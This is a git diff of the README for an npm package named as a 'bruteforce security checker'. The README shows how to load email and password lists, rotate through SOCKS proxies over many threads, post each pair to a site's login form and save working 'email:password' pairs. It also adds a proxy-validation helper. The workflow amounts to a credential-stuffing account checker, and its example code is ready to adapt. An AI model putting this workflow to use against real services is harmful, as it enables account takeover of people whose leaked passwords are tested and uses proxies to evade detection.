@@ -11,6 +11,7 @@ By this module you can:
 - [Documentation](#documentation)
 - [Bruteforce](#bruteforce)
 - [Service](#service)
+- [ProxyChecker](#proxyChecker)
 - [Examples](#examples)
 ---
 
@@ -22,7 +23,6 @@ For methods documentation visit [Doxdox generated docs](https://doxdox.org/k7eon
 
 ---------------------------------
 # BruteForce
-include:
 ```js
 const b = require('@k7eon/bruteforce-security-checker').bruteforce;
 // or
@@ -33,11 +33,26 @@ const {bruteforce} = require('@k7eon/bruteforce-security-checker');
 # Service class
 Service is a class with some usefully methods for implement HTTP request
 
-include:
 ```js
 const Service = require('@k7eon/bruteforce-security-checker').Service;
 // or
 const {Service} = require('@k7eon/bruteforce-security-checker');
+```
+
+---------------------------------
+# ProxyChecker
+Return created class that are ready to check socks proxies from files:
+
+usage:
+```js
+// someFile.js
+const proxyChecker = require('@k7eon/bruteforce-security-checker').proxyChecker;
+proxyChecker.run(
+  'files/proxy.txt',
+  'files/valid_proxies.txt',
+  100,    // threads,
+  60000,  // timeout in ms
+);
 ```
 
 ---------------------------------
@@ -48,6 +63,8 @@ const {Service} = require('@k7eon/bruteforce-security-checker');
 #### Example of *Service* usage
 ```js
   // MySiteClass.js
+  const Service = require('@k7eon/bruteforce-security-checker').Service;
+
   class MySiteClass extends Service {
     
     /**
@@ -58,17 +75,12 @@ const {Service} = require('@k7eon/bruteforce-security-checker');
     * @return {Promise<*>}
     */
     async login(login, password, agent=null) {
-      
       let config = {
         method: 'POST',
         url: 'http://mysite.com/login',
         headers: {
           'accept':           'application/json, text/javascript, */*; q=0.01',
-          'accept-language':  'en-US,en;q=0.5',
           'content-type':     'application/x-www-form-urlencoded; charset=UTF-8',
-          'origin':           'http://mysite.com',
-          'referer':          'http://mysite.com/login',
-          'user-agent':       'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.1.1.835 Yowser/2.5 Safari/537.36',
           'x-requested-with': 'XMLHttpRequest',
         },
         form: {
@@ -77,11 +89,10 @@ const {Service} = require('@k7eon/bruteforce-security-checker');
         },
         json: true,
       };
-      let {response, body} = this.r(config, agent);
+      let {response, body} = await this.r(config, agent);
       
       if (!body.success) return null;
-      let logCookies = this.getSetCookies(response);
-      return logCookies;
+      return this.getSetCookies(response);
     }
   }
   module.exports = new MySiteClass();
@@ -105,12 +116,11 @@ const FILE = {
 };
 
 b.createFilesIfNotExists(FILE);
-b.loadRegisteredAccounts(FILE.registered);
-b.removeAccountsFrom('email', FILE.bad);
+b.loadAccounts(FILE.registered); // {email, password}[]
+b.removeAccountsBy('email', [FILE.bad, FILE.good]);
 b.loadProxyAgents(FILE.proxies);
 
-b.setMetrics({'good':0, 'bad':0})
-b.startShowingMetrics(10000);
+b.showMetrics({'good':0, 'bad':0, 'errors':0}, 1000);
 
 b.start({
   THREADS:      1,
@@ -128,20 +138,18 @@ b.start({
 
       if (!cookie) {
         console.log('bad');
-        fs.appendFileSync(FILE.bad, email+'\n');
-        b.metrics.bad++;
+        b.save(FILE.bad, email, 'bad');  
         return {agent};
       }
-      if (cookie) {
-        console.log('good');
-        fs.appendFileSync(FILE.good, `${[email, password].join(':')]}\n`);
-        b.metrics.good++;
-        return {agent};
-      }
+      
+      console.log('good');
+      b.save(FILE.good, [email, password].join(':'), 'good');  
+      return {agent};
+      
     } catch (e) {
       console.log('error', e);
-      brute.queue.push(account);  // recheck account
-      fs.appendFileSync(FILE.errors, `${JSON.stringify({account, proxy: agent.options.host})}\n${e.stack}\n\n`);
+      b.save(FILE.errors, `${JSON.stringify({account, proxy: agent.options.host})}\n${e.stack}\n`, 'errors');
+      b.reCheck(account);
       return {agent};
     }
     /* end workflow */
@@ -154,55 +162,3 @@ b.start({
 - Run ```node login.js```
 
 
----------------------------------
-#### Bruteforce proxy checker example
-```js
-// proxy_checker.js
-const request = require('request');
-const rp = require('request-promise');
-const brute = require('@k7eon/bruteforce-security-checker').bruteforce;
-const FILE = {
-  proxies:        'proxy.txt',
-  valid_proxies:  'valid_proxies.txt',
-};
-// create empty files in they are not exists. Be careful, 
-// create directory 'files' if not exists
-brute.createFilesIfNotExists(FILE);
-
-// For interval showing statistic
-brute.setMetrics({'active': 0});
-brute.startShowingMetrics(10000);
-
-// Load proxies and create agents
-brute.loadProxyAgents(FILE.proxies);
-brute.start({
-  THREADS: 1000,
-  whatToQueue: 'agents',
-  handlerFunc: async (task, t) => {
-    /* workflow start */
-    let agent = task;
-
-    try {
-      await rp({
-        url: 'https://api.ipify.org?format=json',
-        method: 'GET',
-        timeout: 60000,
-        agent: agent,
-      });
-      let host = agent.options.host;
-      fs.appendFileSync(FILE.valid_proxies, host+'\n');
-      brute.metrics.active++;  // increment metric
-    } catch (e) {
-      // there all errors if HTTP layer. 
-      // This proxy are not needed.
-    }
-    return {task, agent: t};
-    /* end workflow */
-  },
-  drainCallback: () => {
-    console.log('drainCallback');
-  }
-});
-```
-- Put some proxies in **files/proxy.txt**
-- Run ```node proxy_checker.js```
